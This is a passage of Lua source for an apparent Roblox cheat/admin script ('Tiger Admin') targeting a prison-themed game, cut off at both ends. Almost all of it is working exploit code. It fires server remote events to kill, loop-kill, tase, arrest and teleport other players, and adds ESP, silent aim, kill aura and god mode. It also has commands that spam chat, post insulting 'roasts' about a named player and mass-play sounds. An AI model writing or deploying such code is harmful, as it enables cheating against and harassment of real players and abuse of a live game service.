						Temp.spamming = true
						task.spawn(function()
							repeat wait(Temp.DelatSpam or 1.5)
								local ohString1 = r
								local ohString2 = "All"
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
							until not Temp.spamming
						end)
					end
				end
			end
		end,nil,"[MSG,STOP, SET (seconds delay) ex: !spam set 3]",true)
		API:CreateCmd("roast", "spams a message in game", function(args)
			local Target = API:FindPlayer(args[2])
			local Roasts = {
				"plr3's belt size is 'equator',",
				"plr3 is so dumb that not even Dora can explore her,",
				"plr3 is so bad, that it took 2 buses & 1 train to get plr3 to the good side,",
				"plr3 stepped onto a scale, and it said 'TO BE CONTINUED'.",
				"I swerved to miss plr3 in my car and ran out of gas,",
				"When plr3 wears high heels, plr3 strikes oil.",
				"Did you know that plr3 gets group insurance,",
				"When plr3 skips a meal, the stock market drops,",
				"When plr3 goes camping, the bears hide their food.",
			}
			if Target then
				local Compiled = Roasts[math.random(1,#Roasts)]
				Compiled = Compiled:gsub("plr3",Target.DisplayName)
				local ohString1 = Compiled
				local ohString2 = "All"
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
			end
		end,nil,"[TARGET]",true)
		API:CreateCmd("joinlogs", "tells you who is leaving and joining", function(args)
			local Value = ChangeState(args[2],"joinlogs")
			if Value then
				Temp.joinning = game:GetService("Players").PlayerAdded:Connect(function(a)
					game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[JOIN LOGS]: "..a.Name.." has joined the game!", Color = Color3.fromRGB(16, 243, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )

				end)
				Temp.joinning2 = game:GetService("Players").PlayerRemoving:Connect(function(a)
					game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[JOIN LOGS]: "..a.Name.." has left the game!", Color = Color3.fromRGB(50, 14, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
				end)
			else
				pcall(function()
					Temp.joinning2:Disconnect()
					Temp.joinning:Disconnect()
				end)
			end
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("antifling", "prevents players from flinging you", function(args)
			local Value = ChangeState(args[2],"AntiFling")
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("mkill", "kills player by teleport", function(args)
			local function MKILL(target,STOP,P)
				if target == plr or target == plr.Name then
					return
				end
				if typeof(target):lower() == "string" and game:GetService("Players"):FindFirstChild(target) then
					target = game:GetService("Players"):FindFirstChild(target)
				end
				if not STOP then STOP =1 end
				if not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChildOfClass("ForceField") or target.Character:FindFirstChild("Humanoid").Health<1 or not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart")  then
					return
				end
				API:UnSit()
				local saved = API:GetPosition()
				if not P then P = saved else saved = P end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character:FindFirstChild("Head").CFrame
				wait(.2)
				for i =1,10 do
					task.spawn(function()
						game.ReplicatedStorage["meleeEvent"]:FireServer(target)
					end)
				end
				wait(.1)
				if target and target.Character and target.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("Humanoid").Health >1 and STOP ~=3 then
					MKILL(target,STOP+1,P)
					return
				end
				API:MoveTo(saved)
			end
			local r = API:FindPlayer(args[2])
			if r then
				MKILL(r)
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("loopmkill", "kills player by teleport loopkill", function(args)
			local r = API:FindPlayer(args[2])
			if r and not table.find(Temp.LoopmKilling,r.Name) then
				table.insert(Temp.LoopmKilling, r.Name)
				API:Notif("Now loopkilling player")
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("unloopmkill", "kills player by teleport loopkill", function(args)
			local r = API:FindPlayer(args[2])
			if r and table.find(Temp.LoopmKilling,r.Name) then
				table.remove(Temp.LoopmKilling,table.find(Temp.LoopmKilling,r.Name))
				API:Notif("Now unloopkilling player")
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("godmode", "Turns on all settings that prevent you from harm", function(args)
			local Value = ChangeState(args[2],"Godmode")
			if Value then
				States.AntiArrest = true
				States.AntiTase = true
				States.AntiFling = true
				States.antipunch = true
				States.ShootBack = true
				States.AutoItems = true
				States.Antishield = true
				States.anticrash = true
				States.AutoRespawn = true
				wait(.1)
				API:Refresh(true)
			else
				States.AntiArrest = false
				States.AntiTase = false
				States.AntiFling = false
				States.antipunch = false
				States.ShootBack = false
				States.AutoItems = false
				States.Antishield = false
				States.anticrash = false
			end
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("superknife", "One shot knife", function(args)
			workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
			wait(.6)
			local tool = plr.Backpack:WaitForChild("Crude Knife")
			tool.Name = "Super knife"
			if tool then
				Temp.superthingy = game:GetService("UserInputService").InputEnded:Connect(function(inp,endi)
					if not endi then
						if not tool then
							Temp.superthingy = nil
						end
						if inp.UserInputType == Enum.UserInputType.MouseButton1 then
							for i,v in pairs(game:GetService("Players"):GetPlayers()) do
								if v and v~=plr and (v.Character:GetPrimaryPartCFrame().Position-API:GetPosition()*CFrame.new(0,0,.4).Position).Magnitude <3.6 then
									for i =1,20 do
										task.spawn(function()
											game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
										end)
									end
								end
							end
						end
					end
				end)
			end
		end,nil,"",true)
		API:CreateCmd("autoadmin", "Admins someone even if you leave and rejoin", function(args)
			local Target = API:FindPlayer(args[2])
			if Target then
				local Content = game:GetService("HttpService"):JSONDecode(readfile("Tiger_Admin/SavedAdmins.json"))
				local Found = API:FindString(Target.Name,Content)
				local New = {}
				for i,v in pairs(Content) do
					if v then
						New[i] = v
					end
				end
				table.Insert(New, Target.Name)
				if not Found then
					local ohString1 = "/w "..Target.Name.." ".."ADMIN: You have been Autoadmined type [!cmds] in chat to get started!"
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
					writefile("Tiger_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode(New))
					API:Notif("Player has been autoadmined")
				end
			end
		end,nil,"[PLAYER]",true)

		API:CreateCmd("unautoadmin", "unauto admins a player", function(args)
			local Target = API:FindPlayer(args[2])
			if Target then
				local Content = game:GetService("HttpService"):JSONDecode(readfile("Tiger_Admin/SavedAdmins.json"))
				local Found = API:FindString(Target.Name,Content)
				local New = {}
				for i,v in pairs(Content) do
					if v then
						New[i] = v
					end
				end
				table.remove(New,table.find(New,Target.Name))
				pcall(function()
					table.remove(Temp.Admins,table.find(Temp.Admins,Target.Name))
				end)
				if Found then
					writefile("Tiger_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode(New))
					API:Notif("Player has been removed from autoadmin list")
				end
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("earrape", "spams sounds", function(args)
			local Value = ChangeState(args[2],"earrape")
			if Value then
				while wait(.1) do
					for i,v in pairs(workspace:GetDescendants()) do
						if v:IsA("Sound") then
							v:Play()
						end
					end
					if not States.earrape or Unloaded then
						break
					end
				end
			end
		end,nil,"[ON/OFF]",true)
	end
	--//end of premium
	API:CreateCmd("drag", "Enables draggable mode for all tiger guis", function(args)
		local Value = ChangeState(args[2],"DraggableGuis")
	end,nil,"- ENABLES DRAGGABLE GUIS")
	API:CreateCmd("js", "owner", function(args)
		if PremiumActivated then
			if args[2] then
				local PutIn = {}
				for i,v in pairs(args) do
					if v ~=nil and i ~= 1 then
						table.insert(PutIn, v)
					end
				end
				PublicOutput(table.concat(PutIn))
			end
		end
	end,true,"",true,true)
	API:CreateCmd("doors", "prevents players from flinging you", function(args)
		local Value = ChangeState(args[2],"DoorsDestroy")
		if Value then
			workspace.Doors.Parent = game.Lighting
		else
			game.Lighting.Doors.Parent = workspace
		end
	end,nil,"[ON/OFF]")
	API:CreateCmd("copyteam", "copies a player team looped", function(args)
		local r = API:FindPlayer(args[2])
		if r then
			API:ChangeTeam(r.TeamColor.Name)
			Temp.CPTConnect = r:GetPropertyChangedSignal("Team"):Connect(function()
				if Player.Team ~= r.Team then
					API:ChangeTeam(r.Team,true)
				end
			end)
			API:Notif("Loop team changing now.")
		end
	end,nil,"[PLAYER]")
	API:CreateCmd("speed", "sets your players speed", function(args)
		if args[2] and tonumber(args[2]) then
			plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = tonumber(args[2])
		else
			API:Notif("Please set a valid number!")
		end
	end,nil,"[NUMBER]")
	API:CreateCmd("jump", "sets your players jumppower", function(args)
		if args[2] and tonumber(args[2]) then
			plr.Character:FindFirstChildOfClass("Humanoid").JumpPower = tonumber(args[2])
		else
			API:Notif("Please set a valid number!")
		end
	end,nil,"[NUMBER]")
	API:CreateCmd("uncopyteam", "stops copying a players team", function(args)
		Temp.CPTConnect:Disconnect()
		API:Notif("Unloop teamed")
	end,nil,"[PLAYER]")
	API:CreateCmd("kill", "Kills a player", function(args)
		if args[2] == "all" then
			API:killall()
		elseif args[2] == "everyone" then
			API:killall()
		elseif args[2] == "others" then
			API:killall()
		elseif args[2] == "guards" then
			API:killall(game.Teams.Guards)
		elseif args[2] == "inmates" then
			API:killall(game.Teams.Inmates)
		elseif args[2] == "criminals" then
			API:killall(game.Teams.Criminals)
		elseif args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			API:KillPlayer(random)
			API:Notif("Killed "..random.Name)
		else
			local Player = API:FindPlayer(args[2])
			if Player then
				API:KillPlayer(Player)
			end
		end
	end,nil,"[PLAYER,ALL,TEAM]")
	API:CreateCmd("arrest", "Arrests the targeted player", function(args)
		if args[2] and args[2] == "all" then
			local LastPosition = API:GetPosition()
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= game:GetService("Players").LocalPlayer and v.Team == game.Teams.Criminals or (API:BadArea(v) and v.Team == game.Teams.Inmates) and v.Character.PrimaryPart and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
					repeat API:swait()
						API:MoveTo(v.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))
						task.spawn(function()
							workspace.Remote.arrest:InvokeServer(v.Character.PrimaryPart)
						end)
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					API:MoveTo(LastPosition)
					wait(.7)
				end
			end
			API:MoveTo(LastPosition)
		elseif args[2] and args[2]~="all" then
			local LastPosition = API:GetPosition()
			local Target = API:FindPlayer(args[2])
			if Target then
				if Target.Team == game.Teams.Guards or not API:BadArea(Target) then
					return API:Notif("Can't arrest this player!")
				end
				repeat API:swait()
					API:MoveTo(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))
					task.spawn(function()
						workspace.Remote.arrest:InvokeServer(Target.Character.PrimaryPart)
					end)
				until Target.Character["Head"]:FindFirstChildOfClass("BillboardGui")
			end
			API:MoveTo(LastPosition)
		end
	end,nil,"[PLAYER,ALL]")
	local function IsTeamCommandCheck(String)
		for i,v in pairs(game:GetService("Teams"):GetChildren()) do
			if v and v.Name:lower() == String:lower() then
				return v
			end
		end
		return nil
	end
	API:CreateCmd("loopkill", "Kills a player over and over until stopped", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
            local Team = IsTeamCommandCheck(args[2])
            if Team == game.Teams.Criminals then
                States.loopkillcriminals = true
                API:Notif("Loopkilling criminals")
                return
            elseif Team == game.Teams.Inmates then
                States.loopkillinmates = true
                API:Notif("Loopkilling inmates")
                return
            elseif Team == game.Teams.Guards then
                API:Notif("Loopkilling guards")
                States.loopkillguards = true
                return
            end
        elseif args[2] == "all" then
            Temp.Loopkillall = true
            API:Notif("Loopkilling all")
        else
            local Player = API:FindPlayer(args[2])
            if not table.find(Temp.Loopkilling,Player.Name) then
                table.insert(Temp.Loopkilling,Player.Name)
                API:Notif("Now loopkilling selected player.")
            else
                API:Notif("Player is already getting loop killed!",false)
            end
        end
	end,nil,"[PLAYER/ALL,TEAM]")
	API:CreateCmd("lk", "Kills a player over and over until stopped", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = true
				API:Notif("Loopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = true
				API:Notif("Loopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				API:Notif("Loopkilling guards")
				States.loopkillguards = true
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = true
			API:Notif("Loopkilling all")
		else
			local Player = API:FindPlayer(args[2])
			if not table.find(Temp.Loopkilling,Player.Name) then
				table.insert(Temp.Loopkilling, Player.Name)
				API:Notif("Now loopkilling selected player.")
			else
				API:Notif("Player is already getting loop killed!",false)
			end
		end
	end,true,"[PLAYER/ALL,TEAM]")
	API:CreateCmd("unloopkill", "Stops loopkilling a player", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = false
				API:Notif("unLoopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = false
				API:Notif("unLoopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				States.loopkillguards = false
				API:Notif("unLoopkilling guards")
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = false
			API:Notif("Unloopkilling all")
		else
			local Player = API:FindPlayer(args[2])
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				API:Notif("Player has been unlooped")
			else
				API:Notif("Player is not being loopkilled!",false)
			end
		end
	end,nil,"[PLAYER,ALL,TEAM]")
	API:CreateCmd("unlk", "Stops loopkilling a player", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = false
				API:Notif("unLoopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = false
				API:Notif("unLoopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				States.loopkillguards = false
				API:Notif("unLoopkilling guards")
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = false
			API:Notif("Unloopkilling all")
		else
			local Player = API:FindPlayer(args[2])
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				API:Notif("Player has been unlooped")
			else
				API:Notif("Player is not being loopkilled!",false)
			end
		end
	end,true,"[PLAYER,ALL,TEAM]")
	API:CreateCmd("tase", "Tases the target", function(args)
		if args[2] == "all" then
			local Oldt = Player.Team
			API:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait(.7)
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards then
					table.insert(ohTable1, {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			API:ChangeTeam(Oldt)
		elseif args[2] == "criminals" then
			local Oldt = Player.Team
			API:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait(.7)
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Criminals then
					table.insert(ohTable1,{
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			API:ChangeTeam(Oldt)
		elseif args[2] == "inmates" then
			local Oldt = Player.Team
			API:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait()
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Inmates then
					table.insert(ohTable1, {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			API:ChangeTeam(Oldt)
		else
			local Target = API:FindPlayer(args[2])
			if Target then
				local Oldt = Player.Team
				API:ChangeTeam(game.Teams.Guards)
				repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
				wait(.7)
				local ohTable1 = {
					[1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = 0,
						["Cframe"] = CFrame.new(),
						["Hit"] = Target.Character.Head
					}
				}
				local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack.Taser

				game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
				task.spawn(function()
					game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
				end)
				wait(.1)
				API:ChangeTeam(Oldt)
			end
		end
	end,nil,"[PLAYER,ALL]")
	API:CreateCmd("heaven", "Teleports a player to the void", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			API:bring(Player,CFrame.new(2^7,5^34,4^7))
		end
	end,true,"[PLAYER]")

	API:CreateCmd("void", "Teleports a player to the void", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			API:bring(Player,CFrame.new(2^7,5^34,4^7),nil,true)
		end
	end,nil,"[PLAYER]")
	API:CreateCmd("whitelist", "Prevents commands from harming the target", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			if not table.find(API.Whitelisted,Player) then
				table.insert(API.Whitelisted, Player)
				API:Notif("Target has been whitelisted")
			end
		end
	end,nil,"[PLAYER]")
	API:CreateCmd("unwhitelist", "unwhitelists a target", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			if table.find(API.Whitelisted,Player) then
				table.remove(API.Whitelisted,table.find(API.Whitelisted,Player))
				API:Notif("Target has been unwhitelisted")
			end
		end
	end,nil,"[PLAYER]")

	API:CreateCmd("view", "Watches the selected target", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			if Temp.ViewingPlayer  then
				Temp.ViewingPlayer = nil
				wait(.4)
			end
			Temp.ViewingPlayer = Player
			task.spawn(function()
				while wait(.1) do
					pcall(function()
						workspace.CurrentCamera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
					end)
					if not Player or not Temp.ViewingPlayer or Unloaded then
						workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
						break
					end
				end
			end)
		end
	end,nil,"[PLAYER]")
	API:CreateCmd("bring", "Brings a player to you", function(args)
		if args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			task.spawn(function()
				API:bring(random)
			end)
		else
			local Target = API:FindPlayer(args[2])
			if Target then
				task.spawn(function()
					API:bring(Target)
				end)
			end

		end
	end,nil,"[PLAYER]")
	API:CreateCmd("addnuke", "Player dies everyone dies", function(args)
		local Target = API:FindPlayer(args[2])
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..Target.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
		repeat task.wait()
			if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
				break
			end
		until not game
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Target.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
		wait(1.5)
		--//This is what I call perfect work 
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
		wait(1)
		API:killall()
		API:Notif("Nuke from player has been removed.")
	end,nil,"[PLAYER]")
	API:CreateCmd("to", "Teleports to a player", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			API:MoveTo(Player.Character:GetPrimaryPartCFrame())
		end
	end,true,"[PLAYER]")
	API:CreateCmd("cursor ", "Changes mouse icon", function(args)
		if args[2] and tonumber(args[2]) then
			game:GetService("UserInputService").MouseIcon = args[2]
		else
			API:Notif("Invalid ID or no Second arg")
		end
	end,nil,"[ID]")
	API:CreateCmd("goto", "Teleports to a player", function(args)
		local Player = API:FindPlayer(args[2])
		if Player then
			API:MoveTo(Player.Character:GetPrimaryPartCFrame())
		end
	end,nil,"[PLAYER]")
	API:CreateCmd("clickarrest", "click on someone to arrest them", function(args)
		local value = ChangeState(args[2],"ClickArrest")
	end,nil,"[on/off]")
	API:CreateCmd("esp", "shows where all players are", function(args)
		local value = ChangeState(args[2],"esp")
		if value then
			if workspace:FindFirstChild("HIGHLIGHTS_1000") then
				return 
			end
			local Group = Instance.new("Model",workspace)
			Group.Name = "HIGHLIGHTS_1000"
			local esp =Instance.new("Highlight",Group)
			esp.FillColor = BrickColor.White().Color

			Temp.ESP = esp
			local function EspToggle(v)
				if not Temp.EspConnection  then
					return
				end
				task.spawn(function()
					pcall(function()
						if v.Character and v.Character:FindFirstChild("Head") then
							if v.Character.Parent == Group then
								return
							end
							v.Character.Archivable = true
							local v1 = Instance.new("BillboardGui",v.Character:FindFirstChild("Head"))
							local v2 = Instance.new("TextLabel",v1)
							table.insert(Temps.Esp, v1)
							table.insert(Temps.Esp, v2)
							v1.Adornee = v.Character.Head
							v1.Name = "123123123123"
							v1.Size = UDim2.new(0, 100, 0, 150)
							v1.StudsOffset = Vector3.new(0, 2, 0)
							v1.AlwaysOnTop = true
							v2.BackgroundTransparency = 1
							v2.TextColor3 = v.TeamColor.Color
							v2.TextStrokeTransparency = 0
							v2.TextYAlignment = Enum.TextYAlignment.Bottom
							v2.Position = UDim2.new(0, 0, 0, -50)
							v2.Size = UDim2.new(0, 120, 0, 120)
							v2.Font = Enum.Font.SourceSans
							v2.TextSize = 15
							v2.Text = v.Name
							v.Character.Parent = Group
						end
					end)
				end)
			end
			Temp.EspConnection=true
			repeat wait(.5)
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v~= game:GetService("Players").LocalPlayer then
						EspToggle(v)
					end
				end
				for i,v in pairs(Temp.Esps) do
					if v.Parent == nil then
						API:Destroy(v)
					end
				end
			until Temp.EspConnection == nil
		else
			if workspace:FindFirstChild("HIGHLIGHTS_1000") then
				API:Destroy(Temp.ESP)
				Temp.EspConnection = nil
				wait(.1)
				for i,v in pairs(workspace:FindFirstChild("HIGHLIGHTS_1000"):GetChildren()) do
					v.Parent = workspace
				end
				for i,v in pairs(Temp.Esps) do
					API:Destroy(v)
				end
				API:Destroy(workspace:FindFirstChild("HIGHLIGHTS_1000"))

			end
		end
	end,nil,"[ON/OFF]")
	API:CreateCmd("silentaim", "Fire and dont miss", function(args)
		local value = ChangeState(args[2],"SilentAim")
	end,nil,"[on/off]")
	API:CreateCmd("clickkill", "click on someone to kill them", function(args)
		local value = ChangeState(args[2],"ClickKill")
	end,nil,"[on/off]")
	API:CreateCmd("autorespawn", "you die and respawn back", function(args)
		local value = ChangeState(args[2],"AutoRespawn")
	end,nil,"[on/off]")
	API:CreateCmd("antisit", "Prevents you from sitting", function(args)
		local value = ChangeState(args[2],"AntiSit")
		if not value then
			game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		end
	end,nil,"[on/off]")
	API:CreateCmd("antitouch", "Kills anyone who touches you", function(args)
		local value = ChangeState(args[2],"AntiTouch")
	end,nil,"[on/off]")
	API:CreateCmd("arrestaura", "Kills anyone close to you", function(args)
		local value = ChangeState(args[2],"ArrestAura")
	end,nil,"[on/off]")
	API:CreateCmd("killaura", "Kills anyone close to you", function(args)
		local value = ChangeState(args[2],"killaura")
		if value then
			API:CreateKillPart()
		else
			if Temp.KillPart then
				pcall(function()
					Temp.KillPart:Destroy()
				end)
				Temp.KillPart = nil
			end
		end

	end,nil,"[on/off]")
	API:CreateCmd("autoitems", "Gets guns after you die", function(args)
		local value = ChangeState(args[2],"AutoItems")
	end,nil,"[on/off]")
	API:CreateCmd("antiarrest", "!!TRYS!! to Prevents you from getting arrested", function(args)
		local value = ChangeState(args[2],"AntiArrest")
	end,nil,"[on/off]")
	API:CreateCmd("noinvite", "disables discord invite", function(args)
		if writefile and readfile then
			writefile("Tiger_Admin/Invite.json",game:GetService("HttpService"):JSONEncode({Invite_To_Server=false}))
			API:Notif("Discord invite has been disabled!")
		else
			API:Notif("executor not supported.")
		end
	end)
	API:CreateCmd("antipunch", "prevents anyone from punching you", function(args)
		local value = ChangeState(args[2],"antipunch")
		if States.antipunch then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= plr and not table.find(API.Whitelisted,v) then
					task.spawn(function()
						AntiPunchC(v)
					end)
					v.CharacterAdded:Connect(function(c)
						repeat task.wait() until c and c:FindFirstChildOfClass("Humanoid")
						if States.AntiPunch then
							if States.antipunch then
								AntiPunchC(v)
							end
						end
					end)
				end
			end
		end
	end,nil,"[on/off]")
	API:CreateCmd("antishield", "Deletes other peoples shields", function(args)
		local value = ChangeState(args[2],"Antishield")
	end,nil,"[on/off]")
	API:CreateCmd("spawnguns", "Loop kills you to spawn guns", function(args)
		local value = ChangeState(args[2],"spawnguns")
	end,nil,"[on/off]")
	API:CreateCmd("shootback", "Kills anyone who shoots you ", function(args)
		local value = ChangeState(args[2],"ShootBack")
	end,nil,"[on/off]")
	API:CreateCmd("onepunch", "Insta-kills anyone you punch", function(args)
		local value = ChangeState(args[2],"OnePunch")
	end,nil,"[on/off]")
	API:CreateCmd("antitase", "Prevents you from getting tased", function(args)
		local value = ChangeState(args[2],"AntiTase")

		if value then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
			API:Notif("AntiTase has been changed to "..tostring(States.AntiTase))
		elseif not value then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Enable()
			end
			API:Notif("AntiTase has been changed to "..tostring(States.AntiTase))
		end
	end,nil,"[on/off]")
	API:CreateCmd("neutral", "Changes your team to Neutral", function(args)
		API:ChangeTeam(game.Teams.Neutral,true)
	end)
	API:CreateCmd("inmate", "Changes your team to inmate", function(args)
		API:ChangeTeam(game.Teams.Inmates,true)
	end)
	API:CreateCmd("guard", "Changes your team to guard", function(args)
		API:ChangeTeam(game.Teams.Guards,true)
	end)
	API:CreateCmd("criminal", "Changes your team to criminal or a person", function(args)
		if args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			local Target = random
			if Target.Team == game:GetService("Teams").Inmates then
				API:bring(Target,CFrame.new()*CFrame.new(0,2,0))
			elseif Target.Team == game:GetService("Teams").Guards then
				API:bring(Target,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3),true)
			end
		else
			if args[2] then
				local Target = API:FindPlayer(args[2])
				if Target == Player then
					API:ChangeTeam(game.Teams.Criminals,true)
					return
				end
				if Target then
					if Target.Team == game:GetService("Teams").Inmates then
						API:bring(Target,CFrame.new()*CFrame.new(0,2,0))
					elseif Target.Team == game:GetService("Teams").Guards then
